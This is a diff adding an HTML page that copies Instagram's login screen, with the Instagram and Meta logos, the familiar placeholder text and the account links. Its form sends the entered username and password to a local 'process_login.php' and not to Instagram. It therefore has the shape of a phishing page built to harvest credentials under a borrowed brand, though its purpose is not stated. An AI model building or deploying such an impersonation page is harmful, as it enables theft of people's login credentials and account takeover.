@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('bg.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+        }
+
+        /* Language Selector */
+        .language {
+            position: center;
+            top: 50px;
+            margin-top: 30px;
+            font-size: 0.9rem;
+            color: #d1d1d1;
+        }
+
+        /* Container Styling */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        /* Logo */
+        img.logo {
+            width: 80px;
+            margin-top: 80px;
+            margin-bottom: 60px;
+        }
+        img.meta2 {
+          width: 57px;
+            margin-bottom: 40px;
+            margin-top: 40px;
+        }
+
+        /* Input Fields */
+        input[type="text"] {
+            width: 90%;
+            position: center;
+            padding: 15px;
+            top: 650px ;
+            font-size: 1rem;
+            border: 1px solid #475a6b;
+            border-radius: 8px;
+            background-color: #1c2a33;
+            color: white;
+        }
+        
+        input[type="password"]{
+           width: 90%;
+            padding: 15px;
+            margin-top: 8px ;
+            margin-bottom: 20px;
+            position: center;
+            top: 503px;
+            font-size: 1rem;
+            border: 1px solid #475a6b;
+            border-radius: 8px;
+            background-color: #1c2a33;
+            color: white;
+        }
+
+        input::placeholder {
+            color: #b5b5c1;
+        }
+
+        /* Login Button */
+        button {
+            width: 95%;
+            padding: 12px;
+            position: center;
+            top: 600px;
+            background-color: #0064e0;
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #007dc1;
+        }
+
+        /* Forgotten Password Link */
+        .forgot-password {
+            margin-top: 18px;
+            font-size: 1.05rem;
+            font-weight: bold;
+            color: white;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        /* Create Account Link */
+        .create-account {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: white;
+        }
+
+        .create-account a {
+            color: #0095f6;
+           text-decoration: none; 
+            
+        }
+        /* Create New Account Button */
+button.create-account {
+    width: 95%;
+    padding: 12px;
+    margin-top: 250px;
+    background-color: transparent; /* Transparent background */
+    border: 2px solid #47a6fa; /* Blue border */
+    border-radius: 25px;
+    color: #47a6fa; /* Blue text */
+    font-size: 1rem;
+    cursor: pointer;
+}
+
+button.create-account:hover {
+    background-color: rgba(0, 149, 246, 0.1); /* Slight blue background on hover */
+}
+
+
+        /* Meta Footer */
+        
+    </style>
+</head>
+<body>
+    <!-- Language Selector -->
+    <div class="language">English (UK)</div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Logo -->
+        <img src="instalogo.png" alt="Instagram Logo" class="logo">
+
+        <!-- Form -->
+        <form action="process_login.php" method="POST">
+            <input type="text" name="username" placeholder="Username, email address or mobile number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+
+        <!-- Forgotten Password -->
+        <div class="forgot-password">Forgotten Password?</div>
+
+        <!-- Create New Account -->
+        <button class="create-account">
+            Create new account 
+        </button>
+
+        <!-- Meta Footer -->
+        <div>
+          <img src="metalogo.png" class="meta2"> 
+        </div>
+    </div>
+</body>
+</html>
+
